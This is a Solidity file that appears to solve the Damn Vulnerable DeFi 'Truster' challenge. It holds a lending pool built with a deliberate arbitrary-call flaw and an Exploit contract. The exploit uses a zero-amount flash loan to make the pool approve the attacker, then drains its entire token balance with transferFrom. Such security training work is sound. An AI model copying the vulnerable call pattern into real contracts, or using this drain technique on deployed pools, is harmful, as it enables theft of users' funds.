// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "solmate/src/tokens/ERC20.sol";

/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract TrusterLenderPool is ReentrancyGuard {
    using Address for address;

    DamnValuableToken public immutable token;

    error RepayFailed();

    constructor(DamnValuableToken _token) {
        token = _token;
    }

    function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
        external
        nonReentrant
        returns (bool)
    {
        uint256 balanceBefore = token.balanceOf(address(this));

        token.transfer(borrower, amount);
        target.functionCall(data);

        if (token.balanceOf(address(this)) < balanceBefore)
            revert RepayFailed();

        return true;
    }
}

contract DamnValuableToken is ERC20 {
    constructor() ERC20("DamnValuableToken", "DVT", 18) {
        _mint(msg.sender, type(uint256).max);
    }
}

contract Exploit {
    TrusterLenderPool trusterLenderPool;
    DamnValuableToken token;

    constructor(TrusterLenderPool _trusterLenderPool, DamnValuableToken _token) {
        trusterLenderPool = _trusterLenderPool;
        token = _token;
    }

    function exploit() external {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            token.balanceOf(address(trusterLenderPool))
        );

        trusterLenderPool.flashLoan(0, address(this), address(token), data);
        token.transferFrom(address(trusterLenderPool), address(this), token.balanceOf(address(trusterLenderPool)));
    }
}